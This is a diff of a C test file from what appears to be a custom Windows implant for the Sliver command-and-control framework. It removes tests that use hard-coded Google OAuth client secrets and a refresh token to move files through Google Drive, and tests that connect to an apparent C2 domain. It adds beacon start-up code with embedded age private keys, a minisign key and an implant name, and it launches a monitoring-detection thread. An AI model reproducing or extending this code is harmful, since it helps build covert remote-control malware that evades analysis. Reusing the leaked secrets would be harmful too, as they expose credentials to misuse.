@@ -180,52 +180,11 @@ void test4(void) {
 }
 
 void test5(void) {
-	CHAR szUserAgent[] = "curl/7.83.1";
-	CHAR szClientId[] = "178467925713-lerc06071od46cr41r3f5fjc1ml56n76.apps.googleusercontent.com";
-	CHAR szClientSecret[] = "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";
-	CHAR szRefreshToken[] = "1//04U3_Gum8qlGvCgYIARAAGAQSNwF-L9IrmGLxFDUJTcb8IGojFuflKaNFqpQolUQI8ANjXIbrKe0Fq_7VzJUnt0hba15FOoUCJig";
-	PDRIVE_CONFIG pDriveConfig = NULL;
-	pDriveConfig = GoogleDriveInit(szUserAgent, szClientId, szClientSecret, szRefreshToken);
-	RefreshAccessToken(pDriveConfig);
-	//GoogleDriveUpload(pDriveConfig, L"C:\\Users\\Admin\\Downloads\\BC 107.docx");
-	//FreeDri
+	
 }
 
 void test6(void) {
-	CHAR szUserAgent[] = "curl/7.83.1";
-	CHAR szClientId[] = "178467925713-lerc06071od46cr41r3f5fjc1ml56n76.apps.googleusercontent.com";
-	CHAR szClientSecret[] = "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";
-	CHAR szRefreshToken[] = "1//04U3_Gum8qlGvCgYIARAAGAQSNwF-L9IrmGLxFDUJTcb8IGojFuflKaNFqpQolUQI8ANjXIbrKe0Fq_7VzJUnt0hba15FOoUCJig";
-	LPSTR lpFileId = NULL;
-	PDRIVE_CONFIG pGoogleDriverObj = NULL;
-	PBYTE pFileData = NULL;
-	DWORD cbFileData = 0;
 
-	pGoogleDriverObj = GoogleDriveInit(szUserAgent, szClientId, szClientSecret, szRefreshToken);
-	RefreshAccessToken(pGoogleDriverObj);
-	if (!GetFileId(pGoogleDriverObj, "11-7-2024-16-55-12.hpp", &lpFileId) || lpFileId == NULL) {
-		LogError(L"%s.%d: GetFileId failed at %s\n", __FILE__, __LINE__, __FUNCTIONW__);
-		return;
-	}
-
-	pFileData = DriveDownload(pGoogleDriverObj, lpFileId, &cbFileData);
-	if (pFileData == NULL || cbFileData == 0) {
-		if (pFileData != NULL) {
-			FREE(pFileData);
-		}
-
-		FREE(lpFileId);
-		LogError(L"%s.%d: DriveDownload failed at %s\n", __FILE__, __LINE__, __FUNCTIONW__);
-		return;
-	}
-
-	HexDump(pFileData, 0x40);
-	if (pFileData != NULL) {
-		FREE(pFileData);
-	}
-
-	FREE(lpFileId);
-	//FreeDr
 }
 
 void test7(void) {
@@ -818,23 +777,22 @@ void test44(void) {
 }
 
 void test45(void) {
-	BYTE pSessionKey[] = { 27, 77, 147, 18, 250, 64, 204, 175, 58, 32, 210, 175, 62, 24, 182, 214, 170, 115, 195, 221, 244, 178, 189, 132, 38, 103, 156, 124, 12, 1, 2, 19 };
-	PSLIVER_HTTP_CLIENT pClient = ALLOC(sizeof(SLIVER_HTTP_CLIENT));
-	BYTE Msg[] = { 69, 100, 209, 158, 5, 31, 113, 166, 249, 84, 225, 239, 116, 125, 149, 140, 204, 119, 2, 31, 96, 107, 139, 28, 67, 159, 249, 103, 138, 114, 123, 126, 11, 155, 121, 78, 161, 59, 206, 84, 190, 180, 194, 199, 15, 91, 104, 221, 196, 235, 203, 151, 198, 99, 144, 167, 156, 84, 51, 111, 141, 53, 151, 249, 190, 17, 155, 127, 154, 28, 236, 178, 59, 12, 229, 21, 226, 234, 18, 14, 165, 8, 26, 86, 32, 236, 76, 24, 218, 159, 240, 218, 61, 237, 211, 254, 101, 39, 216, 59, 150, 27, 234, 36, 1, 61, 128, 112, 38, 232, 135, 122, 195, 208, 28, 127, 246, 139, 135, 71, 3, 162, 178, 253, 172, 161, 43, 77, 239, 188, 217, 1, 3, 180 };
-	CHAR szServerMinisignPubKey[] = "untrusted comment: minisign public key: 54F9A6711F059ED1\nRWTRngUfcab5VNJWy1PKeUHScRTf/GBnzp9c7ynZTuJcDybb2HgHwfN/";
+	//BYTE pSessionKey[] = { 27, 77, 147, 18, 250, 64, 204, 175, 58, 32, 210, 175, 62, 24, 182, 214, 170, 115, 195, 221, 244, 178, 189, 132, 38, 103, 156, 124, 12, 1, 2, 19 };
+	//PSLIVER_HTTP_CLIENT pClient = ALLOC(sizeof(SLIVER_HTTP_CLIENT));
+	//BYTE Msg[] = { 69, 100, 209, 158, 5, 31, 113, 166, 249, 84, 225, 239, 116, 125, 149, 140, 204, 119, 2, 31, 96, 107, 139, 28, 67, 159, 249, 103, 138, 114, 123, 126, 11, 155, 121, 78, 161, 59, 206, 84, 190, 180, 194, 199, 15, 91, 104, 221, 196, 235, 203, 151, 198, 99, 144, 167, 156, 84, 51, 111, 141, 53, 151, 249, 190, 17, 155, 127, 154, 28, 236, 178, 59, 12, 229, 21, 226, 234, 18, 14, 165, 8, 26, 86, 32, 236, 76, 24, 218, 159, 240, 218, 61, 237, 211, 254, 101, 39, 216, 59, 150, 27, 234, 36, 1, 61, 128, 112, 38, 232, 135, 122, 195, 208, 28, 127, 246, 139, 135, 71, 3, 162, 178, 253, 172, 161, 43, 77, 239, 188, 217, 1, 3, 180 };
+	//CHAR szServerMinisignPubKey[] = "untrusted comment: minisign public key: 54F9A6711F059ED1\nRWTRngUfcab5VNJWy1PKeUHScRTf/GBnzp9c7ynZTuJcDybb2HgHwfN/";
 
-	/*serverPublicKey: { [69 100] [53 145 169 236 40 159 114 61] [223 82 193 19 96 27 37 74 25 127 205 185 41 138 222 170 251 236 164 190 112 186 20 219 150 85 70 183 126 65 193 132] }
-	c.Key: [53 147 30 66 50 102 161 188 109 18 221 32 152 70 196 146 239 155 227 74 90 234 40 216 69 217 32 221 40 121 249 32]
-	plaintext: [51 51 48 98 55 50 102 53 56 55 54 99 50 55 52 56 99 48 52 51 51 97 54 54 52 51 53 102 53 101 48 53]*/
-	PBYTE pPlainText = NULL;
-	DWORD cbPlainText = 0;
+	///*serverPublicKey: { [69 100] [53 145 169 236 40 159 114 61] [223 82 193 19 96 27 37 74 25 127 205 185 41 138 222 170 251 236 164 190 112 186 20 219 150 85 70 183 126 65 193 132] }
+	//c.Key: [53 147 30 66 50 102 161 188 109 18 221 32 152 70 196 146 239 155 227 74 90 234 40 216 69 217 32 221 40 121 249 32]
+	//plaintext: [51 51 48 98 55 50 102 53 56 55 54 99 50 55 52 56 99 48 52 51 51 97 54 54 52 51 53 102 53 101 48 53]*/
+	//PBYTE pPlainText = NULL;
+	//DWORD cbPlainText = 0;
 
-	pClient->pSessionKey = pSessionKey;
-	pClient->cbSessionKey = _countof(pSessionKey);
-	pClient->lpServerMinisignPublicKey = szServerMinisignPubKey;
-	pPlainText = SessionDecrypt(pClient, Msg, _countof(Msg), &cbPlainText);
-	HexDump(pPlainText, cbPlainText);
-	FREE(pClient);
+	//pClient->pSessionKey = pSessionKey;
+	//pClient->lpServerMinisignPublicKey = szServerMinisignPubKey;
+	//pPlainText = SessionDecrypt(pClient, Msg, _countof(Msg), &cbPlainText);
+	//HexDump(pPlainText, cbPlainText);
+	//FREE(pClient);
 }
 
 void test46(void) {
@@ -935,14 +893,14 @@ void test50(void) {
 }
 
 void test51(void) {
-	PSLIVER_HTTP_CLIENT pHttpClient = NULL;
+	/*PSLIVER_HTTP_CLIENT pHttpClient = NULL;
 	pHttpClient = SliverSessionInit("https://ubuntu-icefrog2000.com");
 	if (pHttpClient == NULL) {
 		return;
 	}
 
 	PrintFormatA("SessionID: %s\n", pHttpClient->szSessionID);
-	FreeSliverHttpClient(pHttpClient);
+	FreeSliverHttpClient(pHttpClient);*/
 }
 
 void test52(void) {
@@ -1118,7 +1076,7 @@ void test61(void) {
 }
 
 void test62(void) {
-	PSLIVER_HTTP_CLIENT pSliverClient = NULL;
+	/*PSLIVER_HTTP_CLIENT pSliverClient = NULL;
 	PBYTE pMarshalledRegisterInfo = NULL;
 	DWORD cbMarshalledRegisterInfo = 0;
 	PENVELOPE pRegisterEnvelope = NULL;
@@ -1148,7 +1106,7 @@ void test62(void) {
 CLEANUP:
 	FreeEnvelope(pRegisterEnvelope);
 	FreeSliverHttpClient(pSliverClient);
-	return;
+	return;*/
 }
 
 void test63
@@ -1580,7 +1538,7 @@ void test100(void) {
 }
 
 void test101(void) {
-	PSLIVER_HTTP_CLIENT pSliverClient = NULL;
+	/*PSLIVER_HTTP_CLIENT pSliverClient = NULL;
 	PBYTE pMarshalledRegisterInfo = NULL;
 	DWORD cbMarshalledRegisterInfo = 0;
 	PENVELOPE pRegisterEnvelope = NULL;
@@ -1610,7 +1568,7 @@ void test101(void) {
 CLEANUP:
 	FreeEnvelope(pRegisterEnvelope);
 	FreeSliverHttpClient(pSliverClient);
-	return;
+	return;*/
 }
 
 void test102(void) {
@@ -1733,10 +1691,21 @@ VOID DetectMonitorSystem(VOID)
 	}
 }
 
-VOID TestFinal(VOID)
+VOID Final(VOID)
 {
 	HANDLE hThread = NULL;
 	DWORD dwThreadId = 0;
+	CHAR szRecipientPubKey[] = "age1urmls5nq4m8px0u5gscz7wyf04j8qk7mr8tcm5tn9fxym4p8l5wqwuzjjh";
+	CHAR szPeerPubKey[] = "age1xxvadfula0d3heqzya5r4tkqscwmglhmnuwca9g05dwupk9qt3fsm0d40v";
+	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1G2J4HELJ5LWC5VNU3A94GGHZL7D2ADNQ4EZY9SHEH6ZMRHYY2D3QWJ8GAN";
+	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
+	UINT64 uEncoderNonce = 6979;
+	CHAR szSliverClientName[32] = "ELDEST_ECONOMICS";
+	GLOBAL_CONFIG GlobalConfig;
+#ifdef __BEACON__
+	PSLIVER_BEACON_CLIENT pBeaconClient = NULL;
+#else
+#endif
 
 	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DetectMonitorSystem, NULL, 0, &dwThreadId);
 	if (hThread == NULL) {
@@ -1744,11 +1713,28 @@ VOID TestFinal(VOID)
 		goto CLEANUP;
 	}
 
+	SecureZeroMemory(&GlobalConfig, sizeof(GlobalConfig));
+	GlobalConfig.lpRecipientPubKey = DuplicateStrA(szRecipientPubKey, 0);
+	GlobalConfig.lpPeerPubKey = DuplicateStrA(szPeerPubKey, 0);
+	GlobalConfig.lpPeerPrivKey = DuplicateStrA(szPeerPrivKey, 0);
+	GlobalConfig.lpServerMinisignPublicKey = DuplicateStrA(szServerMinisignPubkey, 0);
+	GlobalConfig.uEncoderNonce = uEncoderNonce;
+	lstrcpyA(GlobalConfig.szSliverName, szSliverClientName);
 
+#ifdef __BEACON__
+	pBeaconClient = BeaconInit(&GlobalConfig);
+	BeaconMain(pBeaconClient);
+#else
+#endif
 CLEANUP:
 	if (hThread != NULL) {
 		CloseHandle(hThread);
 	}
+
+#ifdef __BEACON__
+	FreeBeaconClient(pBeaconClient);
+#else
+#endif
 }
 
 LONG VectoredExceptionHandler
